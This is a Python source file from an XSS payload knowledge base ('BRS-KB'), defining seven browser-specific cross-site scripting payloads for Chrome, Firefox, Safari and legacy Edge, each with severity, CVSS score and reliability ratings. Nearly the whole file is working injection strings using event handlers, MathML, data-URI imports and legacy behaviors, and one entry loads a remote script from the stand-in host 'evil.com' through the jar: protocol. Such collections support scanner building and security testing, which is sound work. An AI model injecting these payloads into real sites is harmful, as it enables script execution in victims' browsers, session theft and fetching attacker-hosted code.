#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Browser-Specific XSS Payloads
"""

from ..models import PayloadEntry


BROWSER_SPECIFIC_PAYLOADS = {
    # Chrome specific
    "chrome_1": PayloadEntry(
        payload="<body onpageshow=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Chrome pageshow event",
        tags=["chrome", "pageshow"],
        browser_support=["chrome"],
        reliability="high",
    ),
    "chrome_2": PayloadEntry(
        payload="<script type=module>import('data:text/javascript,alert(1)')</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Dynamic import with data URI",
        tags=["chrome", "module", "import"],
        browser_support=["chrome", "firefox", "safari"],
        reliability="medium",
    ),
    # Firefox specific
    "firefox_1": PayloadEntry(
        payload="<math><maction actiontype=statusline xlink:href=javascript:alert(1)>click</maction></math>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="MathML maction XSS (Firefox)",
        tags=["firefox", "mathml"],
        browser_support=["firefox"],
        reliability="medium",
    ),
    "firefox_2": PayloadEntry(
        payload="<script src='jar:https://evil.com/xss.jar!/xss.js'></script>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="JAR protocol (Firefox legacy)",
        tags=["firefox", "jar", "legacy"],
        browser_support=["firefox"],
        reliability="low",
    ),
    # Safari specific
    "safari_1": PayloadEntry(
        payload="<marquee onstart=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Marquee onstart (Safari/Chrome)",
        tags=["safari", "marquee"],
        browser_support=["safari", "chrome"],
        reliability="high",
    ),
    "safari_2": PayloadEntry(
        payload="<input type=search onsearch=alert(1) autofocus>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Search input onsearch (Safari)",
        tags=["safari", "search", "onsearch"],
        browser_support=["safari", "chrome"],
        reliability="high",
    ),
    # Edge specific
    "edge_1": PayloadEntry(
        payload='<x style="behavior:url(#default#time2)" onbegin="alert(1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Edge legacy behavior (EdgeHTML)",
        tags=["edge", "legacy", "behavior"],
        browser_support=["edge-legacy"],
        reliability="low",
    ),
}

BROWSER_SPECIFIC_PAYLOADS_TOTAL = len(BROWSER_SPECIFIC_PAYLOADS)
